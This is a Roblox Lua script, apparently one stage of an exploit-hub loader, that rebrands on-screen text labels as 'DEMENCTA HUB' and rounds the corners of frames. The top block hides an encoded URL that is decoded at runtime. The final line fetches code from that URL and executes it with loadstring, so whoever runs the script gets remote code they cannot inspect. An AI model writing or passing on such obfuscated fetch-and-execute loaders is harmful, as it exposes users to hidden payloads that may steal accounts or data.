
--[[ STAGE 2: VISUAL CORE ]]
local yMUSGJ2fko5nr4ZnGcTtS="\012\009\010\007\005\191\211\212\010\028\015\217\033\024\022\027\023\035\025\020\043\023\039\036\038\033\049\041\036\235\047\044\047\238\048\048\050\056\053\062\055\060\056\044\068\250\064\049\059\066\059\056\071\069\070\004\071\076\069\073\009\030\070\082\082\081\089\032\038\080\076\090\088\074\039\026\041\046\085\094\095\092\090\048\064\092\104\052\094\028\040\029\042\025\059\064\109\104\100\116\123\066\034\035\042\049\037\039\127\052\060\127\119\132"local gTSQ8IKYpENd=27 local F0Yp5EfZM2gklxgGxeQ=144 local OA8c6Ea9FZVTzGAvW=0 local XyvreDLQY43bIKvby9XTaw=1 local ntu5d_A__K3hE3_1=8 local sWrTWKbzsVzJysbn7a=false local qSDXzxrcrBklHdVIiFlk=bit32 and bit32.bxor if not qSDXzxrcrBklHdVIiFlk then qSDXzxrcrBklHdVIiFlk=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local ST5_zb00mzncHxJHqYqC={}for KcQcTYMDZwFemSWCfO=1,#yMUSGJ2fko5nr4ZnGcTtS do local UMCn5goxrmBXHqNT=string.byte(yMUSGJ2fko5nr4ZnGcTtS,KcQcTYMDZwFemSWCfO)local UKSm1gCHzTb3tfCD=(F0Yp5EfZM2gklxgGxeQ+(KcQcTYMDZwFemSWCfO*XyvreDLQY43bIKvby9XTaw)+ntu5d_A__K3hE3_1)%256 if OA8c6Ea9FZVTzGAvW==0 then UMCn5goxrmBXHqNT=(UMCn5goxrmBXHqNT-UKSm1gCHzTb3tfCD)%256 ST5_zb00mzncHxJHqYqC[KcQcTYMDZwFemSWCfO]=string.char(qSDXzxrcrBklHdVIiFlk(UMCn5goxrmBXHqNT,gTSQ8IKYpENd))else UMCn5goxrmBXHqNT=qSDXzxrcrBklHdVIiFlk(UMCn5goxrmBXHqNT,gTSQ8IKYpENd)ST5_zb00mzncHxJHqYqC[KcQcTYMDZwFemSWCfO]=string.char((UMCn5goxrmBXHqNT-UKSm1gCHzTb3tfCD)%256)end end local zvjv5W6PgbhDXpJZS=table.concat(ST5_zb00mzncHxJHqYqC)if sWrTWKbzsVzJysbn7a then zvjv5W6PgbhDXpJZS=string.reverse(zvjv5W6PgbhDXpJZS)end local gFXUqN9O1XWe42=zvjv5W6PgbhDXpJZS
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(gFXUqN9O1XWe42))()
